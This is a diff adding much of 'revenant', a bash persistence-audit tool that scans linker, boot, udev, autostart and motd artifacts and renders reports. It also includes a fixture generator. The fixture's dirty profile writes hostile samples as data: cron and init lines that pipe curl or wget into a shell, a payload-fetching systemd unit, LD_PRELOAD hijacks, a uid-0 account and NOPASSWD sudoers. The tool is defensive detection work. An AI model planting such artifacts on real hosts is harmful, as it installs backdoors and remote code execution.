+  for f in "$RVT_ROOT"/etc/ld.so.conf.d/*.conf; do
+    [ -f "$f" ] || continue
+    RVT_COV_LINK_C=$((RVT_COV_LINK_C + 1))
+    rv_read_ok "$f" || continue
+    local line
+    while IFS= read -r line || [ -n "$line" ]; do
+      case "$line" in ''|'#'*) continue ;; esac
+      rv_classify "$line"
+      if [ "$RVT_VOL" = "1" ]; then
+        add_finding high RVT-PRX-002 linker "$f" "linker search path in volatile location: $(rv_clip "$(rv_clean "$line")" 120)"
+        RVT_COV_LINK_F=$((RVT_COV_LINK_F + 1))
+      fi
+    done < "$f"
+  done
+  # PATH hygiene (host scan only; fixtures have no meaningful PATH)
+  if [ -z "$RVT_ROOT" ]; then
+    local comp IFS_BAK="$IFS"
+    IFS=':'
+    for comp in $PATH; do
+      IFS="$IFS_BAK"
+      [ -n "$comp" ] || continue
+      case "$comp" in /*) ;; *) continue ;; esac
+      [ -d "$comp" ] || continue
+      RVT_COV_LINK_C=$((RVT_COV_LINK_C + 1))
+      if rv_ow "$comp"; then
+        if ! rv_in_list "$comp" "$RVT_PATH_DIRS_DONE"; then
+          RVT_PATH_DIRS_DONE="$RVT_PATH_DIRS_DONE
+$comp"
+          add_finding med RVT-PTH-001 linker "$comp" "directory on PATH is world-writable"
+          RVT_COV_LINK_F=$((RVT_COV_LINK_F + 1))
+        fi
+      fi
+    done
+    IFS="$IFS_BAK"
+  fi
+  return 0
+}
+
+# ------------------------------------------------------------------ module: boot / sysv init
+mod_boot() {
+  local f="$RVT_ROOT/etc/rc.local"
+  [ -f "$f" ] || f="$RVT_ROOT/etc/rc.d/rc.local"
+  if [ -f "$f" ]; then
+    RVT_COV_BOOT_C=$((RVT_COV_BOOT_C + 1))
+    if rv_read_ok "$f"; then
+      local body content line
+      content=$(grep -Ev '^[[:space:]]*(#|$)' "$f" 2>/dev/null)
+      if [ -n "$content" ]; then
+        if [ -x "$f" ]; then
+          add_finding med RVT-BOOT-001 boot "$f" "rc.local present and executable"
+          RVT_COV_BOOT_F=$((RVT_COV_BOOT_F + 1))
+        fi
+        body=$content
+        rv_classify "$body"
+        if [ "$RVT_F2S" = "1" ] || [ "$RVT_VOL" = "1" ] || [ "$RVT_OBF" = "1" ]; then
+          add_finding high RVT-BOOT-002 boot "$f" "boot script performs network fetch, obfuscated or volatile execution"
+          RVT_COV_BOOT_F=$((RVT_COV_BOOT_F + 1))
+        fi
+      fi
+    fi
+  fi
+  # SysV init scripts
+  local d="$RVT_ROOT/etc/init.d"
+  [ -d "$d" ] || d="$RVT_ROOT/etc/rc.d/init.d"
+  if [ -d "$d" ]; then
+    while IFS= read -r -d '' x; do
+      RVT_COV_BOOT_C=$((RVT_COV_BOOT_C + 1))
+      rv_read_ok "$x" || continue
+      local body
+      body=$(grep -Ev '^[[:space:]]*(#|$)' "$x" 2>/dev/null)
+      [ -n "$body" ] || continue
+      # package-owned init.d scripts legitimately eval and touch /tmp; require fetch-to-shell
+      rv_classify "$body"
+      if [ "$RVT_F2S" = "1" ]; then
+        add_finding high RVT-BOOT-002 boot "$x" "init script performs network fetch and execution"
+        RVT_COV_BOOT_F=$((RVT_COV_BOOT_F + 1))
+      fi
+    done < <(find "$d" -maxdepth 1 -type f -print0 2>/dev/null)
+  fi
+  # rcN.d symlinks pointing outside init.d
+  local rcdd
+  for rcdd in "$RVT_ROOT"/etc/rc*.d "$RVT_ROOT"/etc/rc.d/rc*.d; do
+    [ -d "$rcdd" ] || continue
+    while IFS= read -r -d '' x; do
+      RVT_COV_BOOT_C=$((RVT_COV_BOOT_C + 1))
+      local ltgt lnorm
+      ltgt=$(readlink "$x" 2>/dev/null) || continue
+      case "$ltgt" in
+        /*) lnorm="$ltgt" ;;
+        *)  lnorm="$(dirname "$x")/$ltgt" ;;
+      esac
+      lnorm=$(rv_norm "$lnorm")
+      case "$lnorm" in
+        *"/etc/init.d/"*|*"/etc/rc.d/init.d/"*) ;;
+        *)
+          add_finding high RVT-BOOT-003 boot "$x" "boot-time symlink targets outside init.d: $(rpath "$lnorm")"
+          RVT_COV_BOOT_F=$((RVT_COV_BOOT_F + 1))
+          # also judge the target content if readable
+          if [ -f "$lnorm" ] && rv_read_ok "$lnorm"; then
+            local tbody
+            tbody=$(grep -Ev '^[[:space:]]*(#|$)' "$lnorm" 2>/dev/null)
+            [ -n "$tbody" ] || continue
+            rv_classify "$tbody"
+            if [ "$RVT_F2S" = "1" ] || [ "$RVT_VOL" = "1" ] || [ "$RVT_OBF" = "1" ]; then
+              add_finding high RVT-BOOT-002 boot "$lnorm" "boot-time target performs network fetch, obfuscated or volatile execution"
+              RVT_COV_BOOT_F=$((RVT_COV_BOOT_F + 1))
+            fi
+          fi
+          ;;
+      esac
+    done < <(find "$rcdd" -maxdepth 1 -type l -print0 2>/dev/null)
+  done
+  return 0
+}
+
+# ------------------------------------------------------------------ module: event triggers (udev, xdg, motd)
+mod_triggers() {
+  # udev rules
+  local ud
+  for ud in "$RVT_ROOT/etc/udev/rules.d" "$RVT_ROOT/lib/udev/rules.d" "$RVT_ROOT/usr/lib/udev/rules.d" "$RVT_ROOT/run/udev/rules.d"; do
+    [ -d "$ud" ] || continue
+    while IFS= read -r -d '' x; do
+      RVT_COV_TRIG_C=$((RVT_COV_TRIG_C + 1))
+      rv_read_ok "$x" || continue
+      local line
+      while IFS= read -r line || [ -n "$line" ]; do
+        case "$line" in ''|'#'*) continue ;; esac
+        case "$line" in *RUN*=*|*PROGRAM*=*) ;; *) continue ;; esac
+        rv_classify "$line"
+        if [ "$RVT_VOL" = "1" ] || [ "$RVT_F2S" = "1" ]; then
+          add_finding high RVT-UDEV-001 triggers "$x" "udev rule executes from volatile path or fetches: $(rv_clip "$(rv_clean "$line")" 120)"
+          RVT_COV_TRIG_F=$((RVT_COV_TRIG_F + 1))
+        fi
+      done < "$x"
+    done < <(find "$ud" -maxdepth 1 -type f -name '*.rules' -print0 2>/dev/null)
+  done
+  # XDG autostart
+  local xd
+  for xd in "$RVT_ROOT/etc/xdg/autostart" "$RVT_ROOT"/home/*/.config/autostart "$RVT_ROOT/root/.config/autostart"; do
+    [ -d "$xd" ] || continue
+    while IFS= read -r -d '' x; do
+      RVT_COV_TRIG_C=$((RVT_COV_TRIG_C + 1))
+      rv_read_ok "$x" || continue
+      local line
+      while IFS= read -r line || [ -n "$line" ]; do
+        case "$line" in ''|'#'*) continue ;; esac
+        case "$line" in
+          Exec=*|TryExec=*) ;;
+          *) continue ;;
+        esac
+        rv_classify "$line"
+        if [ "$RVT_F2S" = "1" ]; then
+          add_finding crit RVT-XDG-002 triggers "$x" "autostart entry fetches and pipes into a shell: $(rv_clip "$(rv_clean "$line")" 120)"
+          RVT_COV_TRIG_F=$((RVT_COV_TRIG_F + 1))
+        elif [ "$RVT_VOL" = "1" ] || [ "$RVT_OBF" = "1" ]; then
+          add_finding high RVT-XDG-001 triggers "$x" "autostart entry executes from volatile path or obfuscated: $(rv_clip "$(rv_clean "$line")" 120)"
+          RVT_COV_TRIG_F=$((RVT_COV_TRIG_F + 1))
+        fi
+      done < "$x"
+    done < <(find "$xd" -maxdepth 1 -type f -name '*.desktop' -print0 2>/dev/null)
+  done
+  # dynamic motd
+  local md="$RVT_ROOT/etc/update-motd.d"
+  if [ -d "$md" ]; then
+    while IFS= read -r -d '' x; do
+      RVT_COV_TRIG_C=$((RVT_COV_TRIG_C + 1))
+      rv_read_ok "$x" || continue
+      local body
+      body=$(grep -Ev '^[[:space:]]*(#|$)' "$x" 2>/dev/null)
+      [ -n "$body" ] || continue
+      rv_classify "$body"
+      if [ "$RVT_F2S" = "1" ] || [ "$RVT_VOL" = "1" ] || [ "$RVT_OBF" = "1" ]; then
+        add_finding high RVT-MOTD-001 triggers "$x" "dynamic motd script performs network fetch, obfuscated or volatile execution"
+        RVT_COV_TRIG_F=$((RVT_COV_TRIG_F + 1))
+      fi
+    done < <(find "$md" -maxdepth 1 -type f -print0 2>/dev/null)
+  fi
+  return 0
+}
+
+# ------------------------------------------------------------------ scan orchestrator
+rv_scan_all() {
+  RVT_FINDINGS_NO=0; RVT_HAS_CRIT=0; RVT_SCORE=0; RVT_SEEN_UNITS=""; RVT_PATH_DIRS_DONE=""
+  RVT_COV_CRON_C=0;   RVT_COV_CRON_F=0
+  RVT_COV_AT_C=0;     RVT_COV_AT_F=0
+  RVT_COV_SVC_C=0;    RVT_COV_SVC_F=0
+  RVT_COV_SHELL_C=0;  RVT_COV_SHELL_F=0
+  RVT_COV_SSH_C=0;    RVT_COV_SSH_F=0
+  RVT_COV_ACCT_C=0;   RVT_COV_ACCT_F=0
+  RVT_COV_SUDO_C=0;   RVT_COV_SUDO_F=0
+  RVT_COV_LINK_C=0;   RVT_COV_LINK_F=0
+  RVT_COV_BOOT_C=0;   RVT_COV_BOOT_F=0
+  RVT_COV_TRIG_C=0;   RVT_COV_TRIG_F=0
+  mod_cron
+  mod_at
+  mod_systemd
+  mod_shell
+  mod_ssh
+  mod_accounts
+  mod_sudo
+  mod_linker
+  mod_boot
+  mod_triggers
+  return 0
+}
+
+# ------------------------------------------------------------------ renderers
+render_banner() {
+  local t1 t2 line
+  t1=$(c_bold "$(c_cyn " revenant ${RVT_VERSION}   persistence audit for unix hosts")")
+  t2=$(c_dim " nothing leaves this machine")
+  line=$(c_dim '+------------------------------------------------------+')
+  printf '%s\n' "$line"
+  printf '%s%s%s\n' "$(c_dim '|')" "$t1" "$(c_dim '|')"
+  printf '%s%s%s\n' "$(c_dim '|')" "$t2" "$(c_dim '|')"
+  printf '%s\n' "$line"
+}
+
+sev_color_fn() { case "$1" in crit) echo c_red ;; high) echo c_mag ;; med) echo c_yel ;; low) echo c_blu ;; info) echo c_dim ;; esac; }
+
+render_terminal() {
+  render_banner
+  printf '\n'
+  printf '%s %s\n' "$(c_bold 'root')" "${RVT_ROOT:-/}"
+  printf '%s %s\n' "$(c_bold 'modules')" "cron at systemd shell ssh accounts sudo linker boot triggers"
+  printf '\n'
+  # coverage summary
+  printf '%s\n' "$(c_dim 'coverage')"
+  printf '  %-10s artifacts=%-4s findings=%s\n' cron     "$RVT_COV_CRON_C"   "$RVT_COV_CRON_F"
+  printf '  %-10s artifacts=%-4s findings=%s\n' at       "$RVT_COV_AT_C"     "$RVT_COV_AT_F"
+  printf '  %-10s artifacts=%-4s findings=%s\n' systemd  "$RVT_COV_SVC_C"    "$RVT_COV_SVC_F"
+  printf '  %-10s artifacts=%-4s findings=%s\n' shell    "$RVT_COV_SHELL_C"  "$RVT_COV_SHELL_F"
+  printf '  %-10s artifacts=%-4s findings=%s\n' ssh      "$RVT_COV_SSH_C"    "$RVT_COV_SSH_F"
+  printf '  %-10s artifacts=%-4s findings=%s\n' accounts "$RVT_COV_ACCT_C"   "$RVT_COV_ACCT_F"
+  printf '  %-10s artifacts=%-4s findings=%s\n' sudo     "$RVT_COV_SUDO_C"   "$RVT_COV_SUDO_F"
+  printf '  %-10s artifacts=%-4s findings=%s\n' linker   "$RVT_COV_LINK_C"   "$RVT_COV_LINK_F"
+  printf '  %-10s artifacts=%-4s findings=%s\n' boot     "$RVT_COV_BOOT_C"   "$RVT_COV_BOOT_F"
+  printf '  %-10s artifacts=%-4s findings=%s\n' triggers "$RVT_COV_TRIG_C"   "$RVT_COV_TRIG_F"
+  printf '\n'
+  if [ "$RVT_FINDINGS_NO" -eq 0 ]; then
+    printf '%s\n' "$(c_grn 'no persistence anomalies.')"
+    printf '\n'
+    printf '%s %s\n' "$(c_bold 'verdict')" "$(c_grn "$(c_bold 'CLEAN')")"
+    return 0
+  fi
+  # findings sorted by severity rank
+  local i
+  printf '%s\n' "$(c_bold 'findings')"
+  {
+    for ((i=0; i<RVT_FINDINGS_NO; i++)); do
+      eval "local sev=\$F_SEV_$i fid=\$F_FID_$i mech=\$F_MECH_$i path=\$F_PATH_$i det=\$F_DET_$i"
+      printf '%s\t%s\t%s\t%s\t%s\n' "$(sev_rank "$sev")" "$sev" "$fid" "$mech" "$path"
+    done
+  } | LC_ALL=C sort -t "$RVT_TAB" -k1,1n -s | while IFS="$RVT_TAB" read -r _rank sev fid mech path; do
+    printf '  %s %-13s %-9s %s\n' "$(sev_glyph "$sev")" "$fid" "$mech" "$(rpath "$path")"
+  done
+  printf '\n'
+  printf '%s %s\n' "$(c_bold 'score')" "$RVT_SCORE"
+  local v
+  v=$(verdict_calc)
+  case "$v" in
+    CRITICAL) printf '%s %s\n' "$(c_bold 'verdict')" "$(c_red "$(c_bold "$v")")" ;;
+    HIGH)     printf '%s %s\n' "$(c_bold 'verdict')" "$(c_mag "$(c_bold "$v")")" ;;
+    ELEVATED) printf '%s %s\n' "$(c_bold 'verdict')" "$(c_yel "$(c_bold "$v")")" ;;
+    LOW)      printf '%s %s\n' "$(c_bold 'verdict')" "$(c_blu "$v")" ;;
+    CLEAN)    printf '%s %s\n' "$(c_bold 'verdict')" "$(c_grn "$v")" ;;
+  esac
+  printf '%s\n' "$(c_dim 'explain any finding: revenant explain <id>')"
+}
+
+render_json() {
+  local v i
+  v=$(verdict_calc)
+  printf '{\n'
+  printf '  "tool": "%s",\n' "$RVT_NAME"
+  printf '  "version": "%s",\n' "$RVT_VERSION"
+  printf '  "root": "%s",\n' "$(esc_json "${RVT_ROOT:-/}")"
+  printf '  "kernel": "%s",\n' "$(esc_json "$(uname -s -r 2>/dev/null)")"
+  printf '  "date": "%s",\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)"
+  printf '  "score": %d,\n' "$RVT_SCORE"
+  printf '  "verdict": "%s",\n' "$v"
+  printf '  "coverage": [\n'
+  printf '    {"module": "cron",     "artifacts": %d, "findings": %d},\n' "$RVT_COV_CRON_C"   "$RVT_COV_CRON_F"
+  printf '    {"module": "at",       "artifacts": %d, "findings": %d},\n' "$RVT_COV_AT_C"     "$RVT_COV_AT_F"
+  printf '    {"module": "systemd",  "artifacts": %d, "findings": %d},\n' "$RVT_COV_SVC_C"    "$RVT_COV_SVC_F"
+  printf '    {"module": "shell",    "artifacts": %d, "findings": %d},\n' "$RVT_COV_SHELL_C"  "$RVT_COV_SHELL_F"
+  printf '    {"module": "ssh",      "artifacts": %d, "findings": %d},\n' "$RVT_COV_SSH_C"    "$RVT_COV_SSH_F"
+  printf '    {"module": "accounts", "artifacts": %d, "findings": %d},\n' "$RVT_COV_ACCT_C"   "$RVT_COV_ACCT_F"
+  printf '    {"module": "sudo",     "artifacts": %d, "findings": %d},\n' "$RVT_COV_SUDO_C"   "$RVT_COV_SUDO_F"
+  printf '    {"module": "linker",   "artifacts": %d, "findings": %d},\n' "$RVT_COV_LINK_C"   "$RVT_COV_LINK_F"
+  printf '    {"module": "boot",     "artifacts": %d, "findings": %d},\n' "$RVT_COV_BOOT_C"   "$RVT_COV_BOOT_F"
+  printf '    {"module": "triggers", "artifacts": %d, "findings": %d}\n'  "$RVT_COV_TRIG_C"   "$RVT_COV_TRIG_F"
+  printf '  ],\n'
+  printf '  "findings": [\n'
+  if [ "$RVT_FINDINGS_NO" -gt 0 ]; then
+    for ((i=0; i<RVT_FINDINGS_NO; i++)); do
+      eval "local sev=\$F_SEV_$i fid=\$F_FID_$i mech=\$F_MECH_$i path=\$F_PATH_$i det=\$F_DET_$i"
+      local sep=","
+      [ $((i + 1)) -eq "$RVT_FINDINGS_NO" ] && sep=""
+      printf '    {"id": "%s", "severity": "%s", "mechanism": "%s", "path": "%s", "detail": "%s"}%s\n' \
+        "$(esc_json "$fid")" "$(esc_json "$sev")" "$(esc_json "$mech")" "$(esc_json "$path")" "$(esc_json "$det")" "$sep"
+    done
+  fi
+  printf '  ]\n'
+  printf '}\n'
+}
+
+render_md() {
+  local v i n_c=0 n_h=0 n_m=0 n_l=0 n_i=0
+  v=$(verdict_calc)
+  for ((i=0; i<RVT_FINDINGS_NO; i++)); do
+    eval "local sev=\$F_SEV_$i"
+    case "$sev" in crit) n_c=$((n_c+1)) ;; high) n_h=$((n_h+1)) ;; med) n_m=$((n_m+1)) ;; low) n_l=$((n_l+1)) ;; info) n_i=$((n_i+1)) ;; esac
+  done
+  printf '# revenant report\n\n'
+  printf -- '- root: `%s`\n' "${RVT_ROOT:-/}"
+  printf -- '- kernel: %s\n' "$(uname -s -r 2>/dev/null)"
+  printf -- '- date: %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)"
+  printf -- '- score: %d\n' "$RVT_SCORE"
+  printf -- '- verdict: **%s**\n\n' "$v"
+  printf '| severity | count |\n|---|---|\n'
+  printf '| critical | %d |\n| high | %d |\n| medium | %d |\n| low | %d |\n| info | %d |\n\n' "$n_c" "$n_h" "$n_m" "$n_l" "$n_i"
+  if [ "$RVT_FINDINGS_NO" -eq 0 ]; then
+    printf 'no persistence anomalies.\n\n'
+  else
+    printf '| id | severity | mechanism | path | detail |\n|---|---|---|---|---|\n'
+    {
+      for ((i=0; i<RVT_FINDINGS_NO; i++)); do
+        eval "local sev=\$F_SEV_$i fid=\$F_FID_$i mech=\$F_MECH_$i path=\$F_PATH_$i det=\$F_DET_$i"
+        printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$(sev_rank "$sev")" "$fid" "$sev" "$mech" "$(rpath "$path")" "$det"
+      done
+    } | LC_ALL=C sort -t "$RVT_TAB" -k1,1n -s | awk -F'\t' '{printf "| %s | %s | %s | `%s` | %s |\n", $2, $3, $4, $5, $6}'
+    printf '\n'
+  fi
+  printf '## coverage\n\n| module | artifacts | findings |\n|---|---|---|\n'
+  printf '| cron | %d | %d |\n'      "$RVT_COV_CRON_C"   "$RVT_COV_CRON_F"
+  printf '| at | %d | %d |\n'       "$RVT_COV_AT_C"     "$RVT_COV_AT_F"
+  printf '| systemd | %d | %d |\n'  "$RVT_COV_SVC_C"    "$RVT_COV_SVC_F"
+  printf '| shell | %d | %d |\n'    "$RVT_COV_SHELL_C"  "$RVT_COV_SHELL_F"
+  printf '| ssh | %d | %d |\n'      "$RVT_COV_SSH_C"    "$RVT_COV_SSH_F"
+  printf '| accounts | %d | %d |\n' "$RVT_COV_ACCT_C"   "$RVT_COV_ACCT_F"
+  printf '| sudo | %d | %d |\n'     "$RVT_COV_SUDO_C"   "$RVT_COV_SUDO_F"
+  printf '| linker | %d | %d |\n'   "$RVT_COV_LINK_C"   "$RVT_COV_LINK_F"
+  printf '| boot | %d | %d |\n'     "$RVT_COV_BOOT_C"   "$RVT_COV_BOOT_F"
+  printf '| triggers | %d | %d |\n\n' "$RVT_COV_TRIG_C" "$RVT_COV_TRIG_F"
+  printf '## first moves\n\n'
+  printf '1. preserve evidence before deleting anything: copy flagged files, capture crontabs and unit files.\n'
+  printf '2. run `revenant baseline --save` on a known-good host and diff on every later pass.\n'
+  printf '3. treat anything executing from /tmp, /var/tmp or /dev/shm as hostile until proven otherwise.\n'
+  printf '4. rotate credentials if any authorized_keys or sudoers artifact is flagged.\n'
+}
+
+# ------------------------------------------------------------------ baseline / drift
+# emit one fingerprint line per finding: <sha> <sev> <fid> <mech> <path>
+_fingerprint_rows() {
+  local i
+  for ((i=0; i<RVT_FINDINGS_NO; i++)); do
+    eval "local sev=\$F_SEV_$i fid=\$F_FID_$i mech=\$F_MECH_$i path=\$F_PATH_$i det=\$F_DET_$i"
+    local norm
+    norm=$(printf '%s' "$det" | sed -E 's/^L[0-9]+: //')
+    printf '%s %s %s %s %s\n' "$(rv_sha256 "$norm")" "$sev" "$fid" "$mech" "$(rpath "$path")"
+  done | LC_ALL=C sort -k1,1
+}
+
+cmd_baseline_save() {
+  local out="$1"
+  rv_scan_all
+  {
+    printf '# revenant baseline v1\n'
+    printf '# root: %s\n' "${RVT_ROOT:-/}"
+    printf '# created: %s\n' "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)"
+    printf '# tool: revenant %s\n' "$RVT_VERSION"
+    _fingerprint_rows
+  } > "$out" || rv_die "cannot write baseline: $out"
+  local n
+  n=$(awk '!/^#/{n++} END{print n+0}' "$out")
+  printf 'baseline saved: %s (%s fingerprints)\n' "$out" "$n"
+  return 0
+}
+
+cmd_baseline_check() {
+  local base="$1"
+  [ -f "$base" ] || rv_die "baseline not found: $base"
+  rv_scan_all
+  local old_f new_f
+  old_f=$(mktemp "${TMPDIR:-/tmp}/rv-base.XXXXXX")
+  new_f=$(mktemp "${TMPDIR:-/tmp}/rv-now.XXXXXX")
+  grep -v '^#' "$base" 2>/dev/null | LC_ALL=C sort > "$old_f"
+  _fingerprint_rows > "$new_f"
+  # drift is row-atomic: a changed line = old row removed + new row added
+  local added=0 removed=0 crit_added=0
+  local row
+  while IFS= read -r row; do
+    [ -n "$row" ] || continue
+    if grep -qFx "$row" "$old_f"; then continue; fi
+    added=$((added + 1))
+    printf 'added    %s %-13s %s\n' "$(printf '%s' "$row" | awk '{print $2}')" "$(printf '%s' "$row" | awk '{print $3}')" "$(printf '%s' "$row" | cut -d' ' -f5-)"
+    case "$(printf '%s' "$row" | awk '{print $2}')" in
+      crit|high) crit_added=1 ;;
+    esac
+  done < "$new_f"
+  while IFS= read -r row; do
+    [ -n "$row" ] || continue
+    if grep -qFx "$row" "$new_f"; then continue; fi
+    removed=$((removed + 1))
+    printf 'removed  %s %-13s %s\n' "$(printf '%s' "$row" | awk '{print $2}')" "$(printf '%s' "$row" | awk '{print $3}')" "$(printf '%s' "$row" | cut -d' ' -f5-)"
+  done < "$old_f"
+  rm -f "$old_f" "$new_f"
+  printf 'drift: %d added, %d removed\n' "$added" "$removed"
+  if [ "$added" -gt 0 ] && [ "$crit_added" = "1" ]; then return 3; fi
+  if [ "$added" -gt 0 ]; then return 2; fi
+  if [ "$removed" -gt 0 ]; then return 1; fi
+  return 0
+}
+
+# ------------------------------------------------------------------ forge (deterministic synthetic fixtures)
+forge_write() {
+  local out="$1" profile="$2" p
+  mkdir -p "$out"
+  # cron: fetch-to-shell (crit)
+  mkdir -p "$out/etc/cron.d" "$out/var/spool/cron/crontabs" "$out/var/spool/cron/atjobs"
+  if [ "$profile" = "dirty" ]; then
+    printf '%s\n' '*/5 * * * * root curl -fsSL http://203.0.113.9/x.sh | sh' > "$out/etc/cron.d/system-sweep"
+    printf '%s\n' '@reboot root /tmp/.sysd/boot.sh' >> "$out/etc/cron.d/system-sweep"
+    printf '%s\n' '0 4 * * * deploy tar -czf /var/backups/h.tgz /home/deploy' > "$out/var/spool/cron/crontabs/deploy"
+    printf '%s\n%s\n' 'JOB 3 2026-01-01 00:00 argv[0]=/bin/sh' '/tmp/.sysd/heartbeat.sh' > "$out/var/spool/cron/atjobs/a0000100"
+    # systemd: volatile exec + network fetch + tight timer + wants symlink
+    mkdir -p "$out/etc/systemd/system/multi-user.target.wants"
+    cat > "$out/etc/systemd/system/system-update.service" <<'EOF'
+[Unit]
+Description=System Update Helper
+[Service]
+Type=oneshot
+ExecStartPre=/usr/bin/curl -fsSL http://203.0.113.9/payload -o /dev/shm/payload && chmod +x /dev/shm/payload
+ExecStart=/dev/shm/payload
+EOF
+    cat > "$out/etc/systemd/system/system-update.timer" <<'EOF'
+[Unit]
+Description=System Update Timer
+[Timer]
+OnCalendar=*:*:00
+Persistent=true
+[Install]
+WantedBy=timers.target
+EOF
+    ln -sf ../system-update.service "$out/etc/systemd/system/multi-user.target.wants/system-update.service"
+    # shell init: LD_PRELOAD + eval/base64 + alias interception
+    mkdir -p "$out/etc/profile.d" "$out/root"
+    printf '%s\n%s\n' 'eval "$(echo aGVsbG8= | base64 -d)"' 'export LD_PRELOAD=/tmp/.x/libx.so' > "$out/etc/profile.d/00-helper.sh"
+    printf "%s\n" "alias sudo='sudo env LD_PRELOAD=/var/tmp/.s/libx.so'" > "$out/root/.bashrc"
+    ZW=$'\xe2\x80\x8b'
+    printf '%s\n' "#${ZW}helper stub" > "$out/etc/profile.d/00-zwstub.sh"
+    # ssh: forced command + world-writable .ssh
+    mkdir -p "$out/home/alice/.ssh"
+    printf '%s\n' 'command="/tmp/.x/beacon" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyMaterialForFixtureOnly alice@old' > "$out/home/alice/.ssh/authorized_keys"
+    chmod 0777 "$out/home/alice/.ssh"
+    # accounts: uid 0 squatter
+    cat > "$out/etc/passwd" <<'EOF'
+root:x:0:0:root:/root:/bin/bash
+deploy:x:1000:1000:Deploy:/home/deploy:/bin/sh
+sync2:x:0:0:sync helper:/home/sync2:/bin/sh
+EOF
+    # sudoers
+    mkdir -p "$out/etc/sudoers.d"
+    printf '%s\n' 'deploy ALL=(ALL) NOPASSWD: ALL' > "$out/etc/sudoers.d/99-helper"
+    # linker: preload + volatile search path
+    printf '%s\n' '/tmp/.x/libx.so' > "$out/etc/ld.so.preload"
+    mkdir -p "$out/etc/ld.so.conf.d"
+    printf '%s\n' '/tmp/.x/libs' > "$out/etc/ld.so.conf.d/00-evil.conf"
+    # boot: rc.local with fetch + init.d script + outside symlink
+    printf '%s\n%s\n' '#!/bin/sh' 'wget -qO- http://203.0.113.9/b.sh | sh' > "$out/etc/rc.local"
+    chmod 0755 "$out/etc/rc.local"
+    mkdir -p "$out/etc/init.d" "$out/etc/rc2.d"
+    printf '%s\n%s\n' '#!/bin/sh' 'curl -fsSL http://203.0.113.9/c.sh | bash' > "$out/etc/init.d/99-cleanup"
+    ln -sf /tmp/.x/rc "$out/etc/rc2.d/S98hook"
+    # triggers: udev + xdg + motd
+    mkdir -p "$out/etc/udev/rules.d" "$out/home/alice/.config/autostart" "$out/etc/update-motd.d"
+    printf '%s\n' 'ACTION=="add", RUN+="/tmp/.x/watcher"' > "$out/etc/udev/rules.d/70-persistent.rules"
+    printf '%s\n%s\n' '[Desktop Entry]' 'Exec=/var/tmp/.agent' > "$out/home/alice/.config/autostart/agent.desktop"
+    printf '%s\n%s\n' '#!/bin/sh' 'curl -fsSL http://203.0.113.9/m.txt > /dev/shm/m.txt' > "$out/etc/update-motd.d/50-banner"
+    chmod 0755 "$out/etc/update-motd.d/50-banner"
+  else
+    # clean profile: only legitimate-looking artifacts, zero findings expected
+    printf '%s\n' '17 * * * * root cd / && run-parts --report /etc/cron.hourly' > "$out/etc/crontab"
+    printf '%s\n' '0 3 * * * php /usr/local/bin/queue-worker.php' > "$out/etc/cron.d/php-scheduler"
+    printf '%s\n' '0 2 * * * deploy tar -czf /var/backups/h.tgz /home/deploy' > "$out/var/spool/cron/crontabs/deploy"
+    mkdir -p "$out/etc/systemd/system"
+    cat > "$out/etc/systemd/system/webapp.service" <<'EOF'
+[Unit]
+Description=Web Application
+[Service]
+Type=simple
+User=www-data
+NoNewPrivileges=true
+ProtectSystem=strict
+PrivateTmp=true
+ExecStart=/usr/bin/webapp --config /etc/webapp/config.toml
+EOF
+    cat > "$out/etc/systemd/system/webapp-daily.timer" <<'EOF'
+[Unit]
+Description=Daily maintenance
+[Timer]
+OnCalendar=weekly
+Persistent=true
+[Install]
+WantedBy=timers.target
+EOF
+    mkdir -p "$out/etc/profile.d" "$out/root"
+    printf '%s\n' 'export EDITOR=vim' > "$out/etc/profile.d/10-editor.sh"
+    printf '%s\n' 'export PAGER=less' > "$out/root/.bashrc"
+    mkdir -p "$out/home/alice/.ssh"
+    printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKeyMaterialForFixtureOnly alice@laptop' > "$out/home/alice/.ssh/authorized_keys"
+    chmod 0700 "$out/home/alice/.ssh"
+    cat > "$out/etc/passwd" <<'EOF'
+root:x:0:0:root:/root:/bin/bash
+deploy:x:1000:1000:Deploy:/home/deploy:/bin/sh
+EOF
+    mkdir -p "$out/etc/ld.so.conf.d"
+    printf '%s\n' '/usr/local/lib' > "$out/etc/ld.so.conf.d/00-local.conf"
+    mkdir -p "$out/etc/udev/rules.d" "$out/etc/xdg/autostart"
+    printf '%s\n' 'ACTION=="add", SUBSYSTEM=="tty", RUN+="/usr/lib/udev/tty-setup"' > "$out/etc/udev/rules.d/50-udev-default.rules"
+    printf '%s\n%s\n' '[Desktop Entry]' 'Exec=/usr/bin/settings-daemon' > "$out/etc/xdg/autostart/org.example.settings.desktop"
+  fi
+  return 0
+}
+
+cmd_forge() {
+  local out="" profile="dirty" force=0
+  while [ $# -gt 0 ]; do
+    case "$1" in
+      --out) out="$2"; shift 2 ;;
+      --profile) profile="$2"; shift 2 ;;
+      --force) force=1; shift ;;
+      *) shift ;;
+    esac
+  done
+  case "$profile" in dirty|clean) ;; *) rv_die "unknown profile: $profile (dirty|clean)" ;; esac
+  [ -n "$out" ] || out="./revenant-fixtures-$profile"
+  if [ -e "$out" ]; then
+    case "$out" in
+      *revenant-fixtures*) rm -rf "$out" ;;
+      *) [ "$force" = "1" ] || rv_die "refusing to overwrite $out (use --force)" ;;
+    esac
+  fi
+  forge_write "$out" "$profile"
+  # pin mtimes so two forges are byte-identical at the archive level, not just in content
+  find "$out" \( -type f -o -type d \) -exec touch -t 202601010000.00 {} \; 2>/dev/null
+  printf 'fixtures written: %s (profile=%s)\n' "$out" "$profile"
+  printf 'scan them: revenant scan --root %s\n' "$out"
+  return 0
+}
+
+# ------------------------------------------------------------------ explain
+cmd_explain() {
+  local fid="$1"
+  case "$fid" in
+    RVT-CRON-001)
+      printf 'RVT-CRON-001 -- scheduled task fetches and pipes into a shell\n'
+      printf '  attack:  T1053.003 (Cron)\n'
+      printf '  why:     a cron entry pulling a remote script and executing it directly is the\n'
+      printf '           classic linux malware re-install loop. removal without breaking this\n'
+      printf '           loop means the infection returns on the next tick.\n'
+      printf '  fix:     capture the entry, quarantine the file, rotate credentials, block the\n'
+      printf '           URL at the edge, hunt the parent process that wrote the crontab.\n' ;;
+    RVT-CRON-002)
+      printf 'RVT-CRON-002 -- scheduled task executes from a volatile path\n'
